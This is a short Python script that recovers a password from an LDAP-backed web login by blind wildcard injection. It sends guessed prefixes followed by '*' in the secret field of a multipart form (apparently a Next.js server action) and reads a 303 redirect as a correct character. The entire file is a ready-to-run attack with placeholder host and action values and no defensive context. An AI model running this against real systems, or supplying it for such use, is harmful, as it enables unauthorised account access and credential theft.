import string
import requests
import os,sys,re

##
##

# Define the URL of the login endpoint
url = 'http://example.intranet:8008/login'

# Define the headers to be used in the request
headers = {
    'Host': 'example.intranet:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c4xxxxxxxxx6ccac9xxxxxx925940',
    'Connection': 'keep-alive'
}

# Define the initial payload structure for the request
payload_template = {
    'ldap_username': 'xxxx_someone_principal',
    'ldap_secret': '',
    'extra_data': '[{},"$K1"]'
}

# Initialize an empty string to hold the discovered password
password = ""

# Loop until the password is fully discovered
while True:
    # Iterate through all lowercase letters and digits
    for char in string.ascii_lowercase + string.digits:
        # Update the payload with the current guessed password and the next character
        payload_template['ldap_secret'] = f'{password}{char}*'
        
        # Prepare the files parameter for the request
        files = {
            '1_ldap-username': (None, payload_template['ldap_username']),
            '1_ldap-secret': (None, payload_template['ldap_secret']),
            '0': (None, payload_template['extra_data'])
        }
        
        # Send the POST request
        response = requests.post(url, headers=headers, files=files)
        
        # Check if the response status code is 303 (indicating a successful guess)
        if response.status_code == 303:
            # Append the guessed character to the password
            password += char
            print(f"Password: {password}")
            break
    else:
        # If no character matched, the password discovery is complete
        break

# Print the discovered password
print(password)

##
##
